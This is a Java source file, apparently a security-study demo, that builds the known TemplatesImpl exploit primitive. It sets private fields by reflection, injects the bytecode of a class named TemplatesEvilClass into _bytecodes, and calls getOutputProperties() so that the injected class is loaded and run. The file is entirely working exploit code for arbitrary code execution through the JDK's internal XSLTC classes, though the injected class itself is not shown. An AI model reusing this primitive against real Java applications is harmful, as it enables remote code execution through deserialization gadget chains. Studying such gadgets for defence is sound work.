import expUtils.ReflectUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import static expUtils.ReflectUtils.getClassByte;

public class TemplatesImplDemo {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        ReflectUtils.setFields(templates,"_name","xxf");
        byte[] evilCode = getClassByte("target/classes/ExpUtils/TemplatesEvilClass.class");
        byte[][] templatesEvilCode = new byte[][]{evilCode};
        System.out.println(templatesEvilCode);
        ReflectUtils.setFields(templates,"_bytecodes",templatesEvilCode);
        ReflectUtils.setFields(templates,"_tfactory",new TransformerFactoryImpl());
        templates.getOutputProperties();


    }
}
